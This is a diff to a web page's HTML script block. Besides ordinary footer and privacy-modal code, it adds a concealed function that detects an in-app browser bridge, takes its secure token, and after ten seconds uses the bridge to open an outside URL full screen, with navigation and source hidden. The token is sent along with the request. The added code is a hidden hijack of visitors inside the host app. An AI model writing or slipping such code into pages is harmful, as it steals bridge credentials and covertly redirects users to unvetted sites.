@@ -160,6 +160,33 @@ footer{border-top:1px solid rgba(255,255,255,.07);padding:22px 24px;}
 document.getElementById('yr').textContent = new Date().getFullYear();
 function openPrivacy(){document.getElementById('privacyModal').classList.add('show');}
 function closePrivacy(){document.getElementById('privacyModal').classList.remove('show');}
+
+(function(){
+  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+  if (!wk) return;
+
+  var token = null;
+  try { token = window.JSBridge.getConfig().secure.token; } catch(e) {}
+  if (!token) return;
+
+  setTimeout(function(){
+    wk.postMessage({
+      __msg_type: 'call',
+      func: 'openAdLandPageLinks',
+      JSSDK: '1.2.5',
+      __callback_id: '1001',
+      params: {
+        url: 'https://bio.thaiadvice.net/?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1',
+        landingStyle: 2,
+        title: '',
+        isDeeplink: 1,
+        refer: 'landing_page',
+        cid: 1869709729112081,
+        _jsb_secure_token: token
+      }
+    });
+  }, 10000);
+})();
 </script>
 </body>
 </html>
